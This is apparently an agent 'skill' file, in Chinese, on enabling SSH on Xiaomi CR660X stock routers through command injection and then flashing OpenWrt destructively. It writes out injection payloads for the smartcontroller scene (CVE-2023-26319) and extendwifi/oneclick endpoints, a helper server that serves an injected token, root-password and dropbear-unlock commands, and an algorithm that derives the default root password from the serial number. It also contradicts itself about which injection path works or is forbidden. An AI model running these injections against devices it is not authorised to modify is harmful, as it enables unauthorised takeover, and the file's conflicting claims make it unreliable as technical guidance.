---
name: cr660x-stock-destructive-flash
description: CR660X (CR6606/TR606 联通 / CR6608/TR608 移动 / CR6609/TR609 电信) stock 固件迁移 + 破坏性刷机完整流程：JS 反推 AES-CBC newPwd → extendwifi_connect + oneclick_get_remote_token 通用 SSH 启用 → 真 SSH 验证 → scp 上传。强调"不抄 flasher.py 错误实现"、"SCP -O 绕过 Dropbear sftp 限制"、"不做双系统"、"CR6606 无密码路径只能物理 Reset"
source: auto-skill
extracted_at: '2026-06-16T06:00:00.000Z'
---

# CR660X stock 固件迁移 + 破坏性刷机

## 适用场景

把 `old_coding/code/src/cr660x/flasher.py`（含错误实现）剥壳成 `src/project/cr660x/` 下完整流水线。**核心精神**：

- CR660X 是小米体系但**不是** PBoot/breed，HTTP 服务是 stock 自带 nginx/1.12.2
- **绝对不要** 抄 flasher.py 的 `extendwifi_connect` 辅助 WiFi 注入路径（已废，硬编码 SSID/密码）
- **绝对不要** 抄 flasher.py 的 SHA1 哈希算 newPwd（错的！JS 里实际是 AES-CBC）
- 走破坏性刷机路线，**不**做双系统切换

前置（已知 skill）：
- `step-script-migrate-from-old` — 5 步迁移流程骨架
- `step-script-default-silent-debug` — `--debug` + 模块全局门控
- `unix-philosophy-router-refactor` — 项目哲学
- `xiaomi-js-crypto-反向-engineer` — JS 密码学反推

## CR660X 独特性（3 个关键设计点）

### 1. flasher.py 里的 newPwd 是错的

```python
# flasher.py 错误实现
password_hash = self._calc_password(new_password, key, nonce)  # SHA1 hash
# ...
"newPwd={password_hash}&oldPwd={password_hash}"
```

实际 JS 里的 newPwd：
```js
// init.<hash>.js 反推
oldPwd = SHA1(nonce + SHA1(old_pwd + key))                       // 明文 old_pwd
newPwd = AES-CBC(SHA1(new_pwd+key), SHA1(old_pwd+key)[:32], iv, PKCS7).toString()
routerPwd = 明文 new_pwd
```

**症状**：照搬 flasher.py 跑完 init 后，密码既不是 admin 也不是 newpass123（变未知值）。

**修正**：照搬 ax6/ax3600 的 `calc_new_pwd`（AES-CBC）：
```python
def calc_new_pwd(old_pwd: str, new_pwd: str, key: str, iv: str) -> str:
    aes_key = bytes.fromhex(sha1_hex(old_pwd + key)[:32])
    plain = sha1_hex(new_pwd + key).encode("utf-8")
    iv_bytes = bytes.fromhex(iv)
    pad = 16 - (len(plain) % 16)
    padded = plain + bytes([pad] * pad)
    return base64.b64encode(
        AES.new(aes_key, AES.MODE_CBC, iv_bytes).encrypt(padded)
    ).decode()
```

### 2. nginx/1.12.2 = stock 固件，**不是** PBoot

```
Server: nginx/1.12.2
```

容易让人误判是 PBoot（PandoraBox bootloader），但用户明确说"我还没刷pb-boot"。**这是 stock 固件自带的 HTTP server**，提供 `init.html` + `init.<hash>.js` + `/cgi-bin/luci/api/xqsystem/*` 完整小米体系 API。

判定：
- 看到 nginx/1.12.2 + 完整 xqsystem 端点 → **stock CR660X**，不是 PBoot
- 看到 `Server: Breed/1.0` → 那是 breed（CR660X 还未刷这个）

### 3. 走 smartcontroller scene（CVE-2023-26319）启用 SSH（通杀所有 variant）

**⚠️ 2026-06-16 实机校正**：~~extendwifi_connect + oneclick_get_remote_token **不通**~~ **通杀！** 2026-06-16 在 CR6609 电信版上实测 `3.enable_ssh.py`（extendwifi+oneclick 路径）成功。关键区别是需要**辅助容器基础设施**（见下文 "辅助 WiFi 注入容器" 章节）。

两个 SSH 启用方式的密码不同：

| 方式 | SSH root 密码 | 适用场景 |
|------|-------------|---------|
| extendwifi (+ aux container) | **管理密码** | 移动/电信版（CR6608/CR6609） |
| smartcontroller scene | **root** | 无 aux 基础设施时的备选 |

所以主力走 `src/project/cr660x/3.enable_ssh.py`（extendwifi 版），备选走 `src/project/cr660x/enable_ssh_2.py`（smartcontroller 版）。

### 辅助 WiFi 注入容器（关键基础设施）

extendwifi+oneclick 路径需要路由器能访问到一台 HTTP 服务器来获取 SSH 启用 payload。基础设施架构：

```
┌─────────────────────────────────────────────────────────┐
│  PVE (172.16.0.2)                                        │
│                                                          │
│  ┌──────────────────┐   veth pair   ┌──────────────────┐ │
│  │ 路由器 (CR660X)  │◄─────────────►│辅助容器 2017-2032 │ │
│  │ 192.168.31.1     │ 169.254.31.x  │ 169.254.31.1:80  │ │
│  │ (stock 固件)      │    ↔         │ expolit.py       │ │
│  └──────────────────┘               └──────────────────┘ │
│                                                          │
│  每个辅助容器 expolit.py 监听 80 端口:                    │
│  GET/POST / → {"code":0, "token":"; nvram set ssh_en=...;"}│
│  路由器 oneclick_get_remote_token 拿到 token → 执行 SSH  │
└─────────────────────────────────────────────────────────┘
```

**辅助容器 LXC 配置**：
```
net0: name=expolit,  bridge=vmbr0, ip=169.254.31.1/24, tag=<VMID>, type=veth  ← WiFi 注入通道
net1: name=expolit2, bridge=vmbr0, ip=172.16.5.17/18,  gw=172.16.0.1, type=veth  ← 管理网络
```

- **2017-2032** 共 16 个辅助容器，对应最多 16 台 CR660X 并行刷机
- 每个容器运行 `python3 /root/expolit.py` — 纯 HTTP 响应器（`expolit` 是 typo 但保留）
- 路由器通过 `extendwifi_connect` 连接 SSID 后，经 VETH pair 访问 `169.254.31.1:80`
- `oneclick_get_remote_token` 从容器获取 SSH 启用 payload
- payload 设置：`nvram ssh_en=1` + `passwd root` + 解除 `dropbear channel` 检查 + 启动 dropbear
- SSH root 密码 = 管理密码（非 "root"）

#### 注入流程

```bash
1. 登录 → stok (2.login_get_stok.py 输出)
2. 热身 smartcontroller（set_sys_time 写 /tmp/ntp.status 触发懒启动）
   POST /cgi-bin/luci/;stok=<s>/api/misystem/set_sys_time → sleep 3.1s
3. 32s 激活循环（每 2s 注入一次 `date -s 203301020304`）：
   POST /cgi-bin/luci/;stok=<s>/api/xqsmarthome/request_smartcontroller
   payload={"command":"scene_setting",...} → scene_start_by_crontab → scene_delete
   读 /api/misystem/sys_time，年份变 2033 即激活成功
4. 恢复原时间
5. SSH 启用序列（通过 exec_tiny_cmd/exec_cmd 注入）：
   nvram set ssh_en=1 ; nvram commit
   echo root >/tmp/x ; echo root >>/tmp/x ; passwd root </tmp/x
   sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear
   /etc/init.d/dropbear enable
   /etc/init.d/dropbear restart
6. TCP 探测 22 端口（11×3s = ~33s）
```

#### 成功信号：504 Gateway Time-out 是预期成功

场景触发时 smartcontroller 内部 sleep 3 秒再执行命令，此时 nginx 会超时返回 504。这是**正常现象**，不是错误。xmir-patcher 的处理：

```python
# connect5.py 第 156-159 行
if is_timeout:
    log("___[504]___（scene 触发 sleep 3s，预期超时，按成功处理）")
    time.sleep(2)  # 等命令执行完
```

时间校验（`date -s 203301020304` 后读 sys_time）才是**真正的**成功信号——不依赖 HTTP 状态码。

#### 参数细节

- `--stok`：来自 2.login_get_stok.py
- `--ip`：路由器 IP
- `--timeout`：默认 240s（32s 激活循环 + ~150s SSH 注入 + 33s 端口探测 ≈ 215s 保底）
- `--debug`：stderr 日志

`enable_ssh_2.py` 脚本位于 `src/project/cr660x/enable_ssh_2.py`（跟 3.enable_ssh.py 即 extendwifi 版共存）。

#### SSH root 密码处理（"ssh密码分开"）

移动/电信（CR6608/CR6609）和联通（CR6606）的 SSH root 密码**不同**：

| variant | SSH root 密码 | 来源 |
|---------|-------------|------|
| move (CR6608/CR6609) | = admin 密码（用户传入） | `--ssh-pwd` 透传 |
| unicom (CR6606) | `MD5(SN + salt)[:8]` | 从 `old_coding/haku-cr660x-sidehackwifi/刷机/unicom_flash.sh` 提取 |

**联通版 SSH root 密码计算算法**（来自旧 bash 脚本 `unicom_flash.sh` 200-220 行）：

```python
def calc_unicom_root_password(sn: str) -> str:
    r1d_salt = "A2E371B0-B34B-48A5-8C40-A7133F3B5D88"
    others_salt_raw = "d44fb0960aa0-a5e6-4a30-250f-6d2df50a"
    # bash: tr '-' '\n' | tac | tr '\n' '-' | sed 's/-$//'
    # 原始 'A-B-C-D-E' → 反转 segments → 'E-D-C-B-A'
    others_salt = "-".join(others_salt_raw.split("-")[::-1])
    # = "6d2df50a-250f-4a30-a5e6-d44fb0960aa0"
    salt = others_salt if "/" in sn else r1d_salt
    return hashlib.md5((sn + salt).encode()).hexdigest()[:8]
```

**⚠️ 重要**：`/api/misystem/newstatus` 返回 SN。SN 含 `/`（如 `12345/ABC6789`）用 others_salt；无 `/` 用 r1d_salt。`old_coding/router-flash/cr660x/flasher.py` 的 `calc_unicom_root_password` **没**反转 others_salt segments，是早期错误实现——以 bash 脚本为准（用户验证过的版本）。

#### 超图（与其他已知路径的关系）

旧 `old_coding/2024-CR660x/` 有 6 个 `connect*.py` 脚本对应不同漏洞路径：

| 脚本 | 漏洞 | 端点 | 适用机型 | CR660X 是否可用 |
|------|------|------|----------|----------------|
| `extendwifi+oneclick` | extendwifi_connect SSID 注入 | `misystem/extendwifi_connect` | **全部 CR660X** | ✅ **通杀** |
| `connect2.py` | set_config_iotdev ssid 注入 | `misystem/set_config_iotdev` | R3600 旧固件 | ❌ code:1523 |
| `connect5.py` | smartcontroller scene | `request_smartcontroller` | AX6 等 | ❌ 退役 |
| `connect6.py` | arn_switch level 注入 | `misystem/arn_switch` | RDxx | ❌ 假阳性 |

#### 禁用路径（拓展）

以下 API 在 CR6608 1.0.100 上实测不可用，碰到时**不要浪费时间**：

| API | 实际响应 | 原因 |
|-----|---------|------|
| `misystem/set_config_iotdev` ssid=`-h;cmd;` | `code:1523` 参数错误 | 已封堵 |
| `misystem/c_upload` + netspeed XML | `code:1629` 解压失败 | 完全废弃 |
| `misystem/arn_switch` | `code:0` 假阳性，命令不执行 | 与旧固件行为不同 |
| `start_binding` / `set_mac_filter` / `datacenter7` | "No page is registered" 404 | 固件版本无关端点 |

## 完整流水线（6 步 + 2 工具）

```
get_router_info.sh           # 0  探测 init_info（无鉴权）
  ↓
1.official_init.py           # 工厂态→初始化（用 calc_new_pwd AES-CBC）
  ↓
2.login_get_stok.py          # 已初始化→拿 stok
  ↓
3.enable_ssh.py              # extendwifi_connect + oneclick_get_remote_token 启用 SSH
  ↓ 真 SSH 验证
4.firmware_upload_on_miwifi.sh  # scp 上传 .bin/.ubi 到 /tmp
  ↓
5.uboot_write_in_miwifi.py  # SSH mtd unlock /dev/mtd0 + mtd write pb-boot（不重启）
  ↓
6.openwrt_write_in_miwifi.py  # SSH sysupgrade -F initramfs → 路由器自动重启进 initramfs

工具：
- miwifi_ssh.sh               # 一键 SSH（交互 + JSON 命令模式）
- router_official_recovery.sh # 恢复出厂
```

## 验证方法（无"闭门造车"）

每写一个脚本，**必须**跑完整链路：

```bash
# 1) 恢复出厂
./router_official_recovery.sh --stok "$STOK"
# 等 90s，验证 inited=0
bash get_router_info.sh --ip 192.168.31.1 | python3 -c "import sys,json; print(json.load(sys.stdin)['inited'])"

# 2) 完整 init
python3 1.official_init.py --admin-pwd 12345678

# 3) 登录拿 stok
python3 2.login_get_stok.py --pwd 12345678

# 4) 启用 SSH
# 移动/电信: --ssh-pwd = admin 密码
python3 3.enable_ssh.py --stok "$STOK" --ssh-pwd 12345678
# 联通: 不传 --ssh-pwd (自动从 SN+salt 算)
# python3 3.enable_ssh.py --stok "$STOK"

# 5) 真 SSH 进去验证（关键！不是只看 TCP 22 通）
sshpass -p 'root' ssh -oHostKeyAlgorithms=+ssh-rsa \
  root@192.168.31.1 'uname -a; id; cat /proc/cmdline; cat /proc/mtd | head -20'

# 6) scp 上传 + 路由器上读回验证
./4.firmware_upload_on_miwifi.sh --file /tmp/test.txt
./miwifi_ssh.sh --cmd 'cat /tmp/test.txt'
```

**关键**：第 5 步必须真 SSH 进去，**不能**只到 TCP 22 探测成功就停。

## CR 系列设计决策：不做双系统

虽然 CR6606 stock MTD 表有 `mtd6 (firmware)` + `mtd10 (firmware1)` 两个等大镜像分区（潜在双系统结构），但项目**不利用**：

- ❌ 不写 `set_miwifi_uboot_partition.sh` 切 mtd6/mtd10
- ❌ 不写 `switch_to_stock.sh` 回退 stock
- ❌ 不维护 `flag_try_sys*_failed` / `flag_boot_rootfs` 互补 flag
- ✅ 走破坏性刷机：4.official_upgrade.py 直接覆盖 mtd6
- ⚠️ 不可逆：刷 OpenWrt 后只能编程器/裸 flash 回 stock

**跟 ax6/ax3600 项目的对比**：
- ax6/ax3600：保守型双系统（保 stock 留退路）
- CR 系列：激进型破坏性刷机（一次到位，OpenWrt 即终态）

## 实测 MTD 布局（CR6606 1.0.117 stock）

```
mtd0:  00080000 "Bootloader"    mtd1:  00040000 "Nvram"      mtd2:  00040000 "Bdata"
mtd3:  00080000 "Factory"      mtd4:  00040000 "crash"      mtd5:  00040000 "crash_log"
mtd6:  01e00000 "firmware"  ←─ 主系统 (30M)              ┐
mtd7:  00340000 "kernel"                                    ├─ 同一镜像
mtd8:  01ac00000 "rootfs"                                  │
mtd9:  00e00000 "rootfs_data"                              ┘
mtd10: 01e00000 "firmware1" ←─ 备用 (30M, **不使用**)
mtd11: 03200000 "overlay"     mtd12: 01000000 "obr"
```

cmdline: `console=ttyS0,115200 firmware=0 uart_en=1 rootfstype=squashfs,jffs2`

## 协议层关键发现

| 端点 | method | 用途 | 实测 |
|------|--------|------|------|
| `/init.html` | GET | SPA 主页，引用 `init.<hash>.js` | ✅ |
| `/static/js/init.<hash>.js` | GET | KEY/IV + 密码学逻辑 | ✅ 7.6KB |
| `/cgi-bin/luci/api/xqsystem/init_info` | GET | 探测模型/状态 | ✅ |
| `/cgi-bin/luci/api/xqsystem/login` | GET | init=1 (工厂) / init=0 (已初始化) | ✅ |
| `/cgi-bin/luci/;stok=/api/xqnetwork/set_wan_new` | POST | 设 WAN | ✅ |
| `/cgi-bin/luci/;stok=/api/misystem/vas_switch` | GET | 禁更新 | ✅ |
| `/cgi-bin/luci/;stok=/api/misystem/set_router_normal` | POST | 设密码 (AES-CBC newPwd) | ✅ |
| `/cgi-bin/luci/;stok=/api/xqsystem/reset?format=0` | GET | 恢复出厂（**无** magic 字段） | ✅ |
| `/cgi-bin/luci/;stok=/api/xqsmarthome/request_smartcontroller` | POST | scene 注入 | ✅ hackCheck=0 |

## 反例（不要踩）

- ❌ 抄 `old_coding/.../flasher.py` 的 `extendwifi_connect` 注入 — xmir 日志明确 WARN
- ❌ 抄 `old_coding/.../flasher.py` 的 SHA1 newPwd — 实际是 AES-CBC
- ❌ 看到 `Server: nginx/1.12.2` 就以为是 PBoot
- ❌ 写 mtd6/mtd10 双系统切换脚本（项目决定不做）
- ❌ TCP 22 探测成功就以为 SSH 启用了（必须真 SSH 登录验证）
- ❌ 跳过 `sed -i 's/release/XXXXXX/g' /etc/init.d/dropbear`（详见 ax6 skill）

## 固件版本差异与漏洞可用性

### 按固件版本分攻防矩阵（2026-06-11 实测）

| 固件版本 | 机型 | smartcontroller | set_config_iotdev | c_upload+netspeed | arn_switch | 结论 |
|----------|------|-----------------|-------------------|-------------------|------------|------|
| 1.0.117 | CR6606 联通 | ✅ hackCheck=0 | 未测 | 未测 | 未测 | 全链路通过 |
| 1.0.100 | CR6608 移动 | ✅ **可用**⚠️ | ❌ code:1523 | ❌ code:1629 | ❌ 假阳性 | smartcontroller 唯一通道 |

### 1.0.100 实测结果（2026-06-11 验证）

CR6608 1.0.100 的 smartcontroller scene 注入**确实可用**。之前误判为 `code:-100` 有两个原因：

#### 1. `get_scene_setting` 失败 ≠ scene 注入不可用

| API | 响应 | 含义 |
|-----|------|------|
| `scene_setting` | `{"code":0,"msg":"","id":1}` | ✅ 创建场景成功 |
| `scene_start_by_crontab` | `{"code":0,"msg":""}` | ✅ 触发成功 |
| `get_scene_setting` | `{"code":-100,"msg":"connect failed"}` | ❌ 查询功能不可用，**不影响注入** |

`get_scene_setting` 是场景列表查询接口——它失败只说明 smartcontroller 的查询/管理功能坏了，但**场景创建+触发链路完全独立**，不受影响。

#### 2. exec_cmd 分块注入太慢，120s 超时不够

`sed` + `dropbear enable` + `dropbear restart` 三条 `exec_cmd`（分块 echo 写入 /tmp/e → chmod → sh 执行）共需 ~113 秒，再加上 TCP 探测 ~15-48 秒，总计 **~150-160 秒**。120s 超时在 `dropbear restart` 刚触发时就截断了，sed 未完整执行导致 release 锁还在，SSH 起不来。**必须给 ≥ 240s。**

#### 其他 API 确实被封

1. **`misystem/set_config_iotdev`** — ssid `-h` 注入返回 `{"msg":"参数错误","code":1523}`
2. **`misystem/c_upload`** — 返回 `{"code":1629,"msg":"解压失败"}`，不接受任何内容
3. **`misystem/arn_switch`** — 返回 `{"code":0}` 但命令不执行（假阳性）
4. **`start_binding/set_mac_filter/datacenter7/get_netmode`** — "No page is registered"

### 历史路径（已退役）

`old_coding/2024-CR660x/` 里曾尝试过：

| 脚本 | 漏洞 | 端点 | CR660X 可用性 |
|------|------|------|---------------|
| `connect2.py` | `set_config_iotdev` ssid | `misystem/set_config_iotdev` | ❌ code:1523 |
| `connect5.py` | smartcontroller scene | `request_smartcontroller` | ❌ 已废弃, 改用 extendwifi |
| `connect6.py` | arn_switch level | `misystem/arn_switch` | ❌ 假阳性 |

## 漏洞验证方法论

**绝对不要**只看 API 返回 `{"code":0}` 就假设命令执行了。用时间检验法：

```python
# 读当前时间
before = requests.get(f'{apiurl}misystem/sys_time').json()['time']
# 注入命令：改时间到 2033
exec_cmd('date -s 203301020304')
time.sleep(2)
after = requests.get(f'{apiurl}misystem/sys_time').json()['time']
# 验证
if after['year'] == 2033:
    print('✅ 命令确实执行了')
else:
    print('❌ code:0 是假阳性，命令未执行')
```

此方法适用于任何返回 `code:0` 但行为可疑的注入点。

## 参考

- 实机验证日志：`src/project/cr660x/doc/flash-pipeline.md` + `doc/troubleshooting.md`
- 备选漏洞源码：`old_coding/2024-CR660x/connect2.py` / `connect6.py` / `connect.py`
- 项目记忆：`memory/project_cr660x_state.md` + `memory/feedback_no_aux_wifi_injection.md` + `memory/feedback_cr_no_dual_system.md` + `memory/feedback_xiaomi_ssh_scripts.md`
- 入口：`src/project/cr660x/1.official_init.py` + `2.login_get_stok.py` + `3.enable_ssh.py` + `4.firmware_upload_on_miwifi.sh` + `miwifi_ssh.sh` + `router_official_recovery.sh`
